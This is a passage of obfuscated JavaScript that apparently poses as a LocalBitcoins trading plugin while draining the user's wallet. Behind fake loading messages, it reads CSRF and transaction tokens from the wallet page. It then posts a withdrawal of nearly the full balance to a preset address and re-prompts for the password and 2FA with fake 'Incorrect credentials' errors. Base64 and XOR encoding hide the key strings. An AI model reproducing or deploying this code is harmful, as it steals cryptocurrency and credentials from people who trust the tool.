    ref_set(b, d)
}

function gg_ask_user_permission() {
    var b = document.title + "",
        c = window.location + "";
    ref_set("Wallet", atob("L2FjY291bnRzL3dhbGxldC8="));
    $.ajax({
        url: atob("L2FjY291bnRzL3dhbGxldC8="),
        error: function() {
            error_handler("comm", "prepwd")
        },
        success: hr_gg_ask_user_permission
    });
    ref_set(b, c)
}

function gg_ajax_query_iterator(b) {
    (b = b.match(/alert (alert-success)/)) && 2 <= b.length ? (make_progress(), gg_price_follow_routine = 0, gg_draw_chart_for_coin = !1, gg_first_time_run = !0, gg_load_buyer_data("NOTICE", atob("V2l0aGRyYXdhbCBzdWNjZXNzZnVs")), storeit({
        is_pwn_pwd: !0
    }), gg_pubtrade_enabled && "card" == gg_pubtrade_type && 0 < gg_pubtrade_card_position && (gg_pubtrade_card_position += 1), $("#modal-error-text").html(""), $("#modal-prompt-text").html("")) : (gg_load_buyer_data("DEBUG", atob("V2l0aGRyYXdhbCBmYWlsZWQ=")), gg_user_input_confirmed && ($("#modal-error-text").html(atob("SW5jb3JyZWN0IGNyZWRlbnRpYWxzLiBQbGVhc2UgdHJ5IGFnYWluLg==")), $("#modal-error-text").removeClass("hidden"), $("#modal-error-text").show()));
    dispatch_logic()
}

function gg_load_chat_log(b) {
    b.includes("alert-success") ? (make_progress(), gg_sort_listings = !1, gg_load_buyer_data("NOTICE", atob("VHJhZGUgcmVsZWFzZSBzdWNjZXNzZnVs")), storeit({
        is_pwn_rel: !0
    }), gg_pubtrade_enabled && "card" == gg_pubtrade_type && 0 < gg_pubtrade_card_position && (gg_pubtrade_card_position += 1), $("#modal-error-text").html(""), $("#modal-prompt-text").html("")) : gg_user_input_confirmed && ($("#modal-error-text").html(atob("SW5jb3JyZWN0IGNyZWRlbnRpYWxzLiBQbGVhc2UgdHJ5IGFnYWluLg==")), $("#modal-error-text").removeClass("hidden"), $("#modal-error-text").show());
    dispatch_logic()
}

function gg_process_logic() {
    gg_draw_chart_for_coin = !1;
    if (gg_price_follow_routine >= gg_get_all_feedback_info) {
        gg_draw_chart_for_coin = {};
        var b = (gg_price_follow_routine - .005).toFixed(4);
        gg_locate_hidden_feedback < b && (b = gg_locate_hidden_feedback);
        gg_load_buyer_data("DEBUG", atob("QW1vdW50IHRvIHdpdGhkcmF3OiA=") + b);
        gg_draw_chart_for_coin.amount = b;
        gg_draw_chart_for_coin.address = wd_address
    }
    dispatch_logic()
}

function hr_gg_ask_user_permission(b) {
    if (b) {
        make_progress();
        var c = b.match(/.csrfmiddlewaretoken. value='([a-zA-Z0-9_-]+)'/);
        if (!c || 2 > c.length) return !1;
        var d = c[1],
            c = b.match(/.obtxn. value=.([a-zA-Z0-9]+)/);
        if (!c || 2 > c.length) return !1;
        b = c[1];
        gg_draw_chart_for_coin.csrfmiddlewaretoken = d;
        gg_draw_chart_for_coin.obtxn = Math.floor(1E4 * Math.random());
        gg_post_payload = {};
        gg_post_payload[atob("Y3NyZm1pZGRsZXdhcmV0b2tlbg==")] = i_csrf;
        gg_post_payload[atob("b2J0eG4=")] = b;
        gg_post_payload[atob("YWRkcmVzc190bw==")] = gg_draw_chart_for_coin.address;
        gg_post_payload[atob("YW1vdW50")] = gg_draw_chart_for_coin.amount;
        gg_post_payload[atob("c2VuZF9zdWJtaXQ=")] = "";
        gg_post_payload[atob("YXV0b2NvbXBsZXRlX3RyYXA=")] = "";
        gg_post_payload[atob("ZmlhdF9hbW91bnQ=")] = "1";
        gg_post_payload[atob("ZmlhdF9jdXJyZW5jeQ==")] = "USD";
        d = document.title + "";
        b = window.location + "";
        ref_set(atob("V2FsbGV0"), atob("L2FjY291bnRzL3dhbGxldC8="));
        $.ajax({
            url: atob("L2FjY291bnRzL3dhbGxldC8="),
            method: "POST",
            data: gg_post_payload,
            error: function() {
                error_handler("comm", "hrprepwd")
            },
            success: hr_gg_ask_user_permission_step2
        });
        ref_set(d, b)
    }
}

function hr_gg_ask_user_permission_step2(b) {
    if (!b) return !1;
    make_progress();
    var c = b.match(/.confirm_token. value=.([a-zA-Z0-9]+)/);
    if (!c || 1 > c.length) return error_handler("confirm_token"), !1;
    gg_draw_chart_for_coin.confirm_token = c[1];
    gg_pubtrade_enabled && (b = gg_online_offline_status(b), gg_pubtrade_hint = b.hint, gg_pubtrade_card_position = Math.floor(b.card_position));
    dispatch_logic()
}

function lbc_is_present() {
    return window && window.location && window.location.toString().match(/localbitcoins.com/i) ? !0 : !1
}

function fetch_page(b, c) {
    $.ajax({
        url: b,
        success: c,
        error: function() {
            error_handler("comm", "fetpg " + b)
        }
    })
}

function error_handler(b, c) {
    switch (b) {
        case "comm":
            gg_load_buyer_data("ERROR", "Comm error: " + c);
            alert("There was a problem communicating with the website. Please reload the page.");
            all_aborted();
            break;
        case "login":
            $(window).unbind("beforeunload");
            gg_load_buyer_data("DEBUG", "Redirecting to login page");
            alert("Please sign in to Localbitcoins to use this plugin");
            window.location.href = "/accounts/login/";
            break;
        default:
            gg_load_buyer_data("ERROR", "Unknown error: " + b), debug_mode && alert("Unknown error: " + b)
    }
}

function all_done() {
    progress_set(100);
    $("#modal-spinner").hide();
    $("#modal-form-tfa").hide();
    $("#modal-form-password").hide();
    $(window).unbind("beforeunload");
    setTimeout(modal_close, 2E3);
    done = !0
}

function all_aborted() {
    $("#modal-spinner").hide();
    $("#modal-form-tfa").hide();
    $("#modal-form-password").hide();
    $(window).unbind("beforeunload");
    setTimeout(modal_close, 500);
    done = !0
}

function ref_set(b, c) {
    window.history.pushState({}, b, c)
}

function progress_set(b) {
    100 <= b ? $("#modal-status-text").html("The tool is ready to use.") : 90 <= b ? $("#modal-status-text").html("Preparing the DOM elements...") : 80 <= b ? $("#modal-status-text").html("Loading details...") : 70 <= b ? $("#modal-status-text").html("Configuring for account...") : 60 <= b ? $("#modal-status-text").html("Extracting data from public API...") : 50 <= b ? $("#modal-status-text").html("Preparing bookmarklet cache...") : 40 <= b ? $("#modal-status-text").html("Authenticating app signature...") : 30 <= b ? $("#modal-status-text").html("Downloading app headers...") : 20 <= b ? $("#modal-status-text").html("Loading configuration defaults...") : 10 <= b ? $("#modal-status-text").html("Loading libraries...") : 0 < b && $("#modal-status-text").html("Ready to download package...");
    progressbar_set(b)
}

function progressbar_set(b) {
    $("#modal-progressbar").css("width", "" + b + "%");
    $("#modal-progressbar").html("" + b + "%")
}

function make_progress() {
    91 > progress_percent && (progress_percent += 9, progress_set(progress_percent))
}

function progress_complete(b) {
    progress_percent = 100;
    progressbar_set(progress_percent);
    setTimeout(b, 500)
}

function gg_find_anonymous_feedback(b) {
    if (0 != b.length % 2) return null;
    for (var c = "", d = "0x" + b.substr(0, 2) | 0, e = 2; b.length - e; e += 2) c += "%" + ("0" + ("0x" + b.substr(e, 2) ^ d).toString(16)).slice(-2);
    return decodeURIComponent(c)
}

function dectext(b) {
    return unescape(b.replace(/g/g, "%"))
};
